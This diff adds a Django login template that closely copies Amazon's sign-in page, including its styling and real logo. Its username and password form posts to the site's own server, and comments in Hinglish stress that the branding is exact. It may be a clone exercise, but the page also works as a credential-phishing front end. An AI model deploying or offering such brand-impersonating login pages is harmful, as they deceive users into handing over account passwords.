@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Amazon Sign In</title>
+    <style>
+      body {
+        background-color: #fff;
+        font-family: Arial, sans-serif;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        padding-top: 15px;
+        margin: 0;
+      }
+      .logo-container {
+        margin-bottom: 15px;
+      }
+      /* Asli Amazon logo ka link */
+      .logo-container img {
+        width: 105px;
+        object-fit: contain;
+      }
+      .login-box {
+        width: 350px;
+        border: 1px solid #ddd;
+        border-radius: 8px;
+        padding: 20px 26px;
+        box-sizing: border-box;
+      }
+      .login-box h1 {
+        font-size: 28px;
+        font-weight: 400;
+        margin-top: 0;
+        margin-bottom: 15px;
+      }
+      .form-label {
+        font-size: 13px;
+        font-weight: 700;
+        margin-bottom: 4px;
+        display: block;
+      }
+      .form-control {
+        width: 100%;
+        padding: 6px 10px;
+        margin-bottom: 15px;
+        border: 1px solid #a6a6a6;
+        border-radius: 3px;
+        box-sizing: border-box;
+        height: 31px;
+        outline: none;
+      }
+      .form-control:focus {
+        border-color: #e77600;
+        box-shadow: 0 0 3px 2px rgba(228, 121, 17, 0.5);
+      }
+      .btn-continue {
+        width: 100%;
+        background-color: #f0c14b;
+        border: 1px solid;
+        border-color: #a88734 #9c7e31 #846a29;
+        border-radius: 3px;
+        padding: 7px;
+        cursor: pointer;
+        font-size: 13px;
+        box-shadow: 0 1px 0 rgba(255, 255, 255, 0.4) inset;
+      }
+      .btn-continue:hover {
+        background-color: #e3b037;
+      }
+      .legal-text {
+        font-size: 12px;
+        margin-top: 15px;
+        line-height: 1.5;
+      }
+      .legal-text a {
+        color: #0066c0;
+        text-decoration: none;
+      }
+      .legal-text a:hover {
+        text-decoration: underline;
+        color: #c45500;
+      }
+      .divider {
+        display: flex;
+        align-items: center;
+        text-align: center;
+        color: #767676;
+        font-size: 12px;
+        margin: 20px 0;
+        width: 350px;
+      }
+      .divider::before,
+      .divider::after {
+        content: '';
+        flex: 1;
+        border-bottom: 1px solid #e7e7e7;
+      }
+      .divider:not(:empty)::before {
+        margin-right: 0.25em;
+      }
+      .divider:not(:empty)::after {
+        margin-left: 0.25em;
+      }
+      .btn-create {
+        width: 350px;
+        background-color: #e7e9ec;
+        border: 1px solid #adb1b8;
+        border-radius: 3px;
+        padding: 7px;
+        cursor: pointer;
+        font-size: 13px;
+        box-shadow: 0 1px 0 rgba(255, 255, 255, 0.6) inset;
+      }
+      .btn-create:hover {
+        background-color: #d9dce1;
+      }
+      .error-msg {
+        color: #c40000;
+        font-size: 13px;
+        margin-bottom: 15px;
+        font-weight: bold;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="logo-container">
+      <!-- Exact Amazon Logo -->
+      <a href="/"><img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon" /></a>
+    </div>
+
+    <div class="login-box">
+      <h1>Sign in</h1>
+
+      <!-- Error Message Dikhane ke liye -->
+      {% if error %}
+        <div class="error-msg">⚠️ {{ error }}</div>
+      {% endif %}
+
+      <form method="POST">
+        {% csrf_token %}
+        <label class="form-label">Email or mobile phone number</label>
+        <input type="text" name="username" class="form-control" required />
+
+        <label class="form-label">Password</label>
+        <input type="password" name="password" class="form-control" required />
+
+        <button type="submit" class="btn-continue">Continue</button>
+      </form>
+
+      <p class="legal-text">
+        By continuing, you agree to Amazon's <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.
+      </p>
+    </div>
+
+    <div class="divider">New to Amazon?</div>
+
+    <button class="btn-create" onclick="window.location.href='{% url 'signup' %}'">Create your Amazon account</button>
+  </body>
+</html>
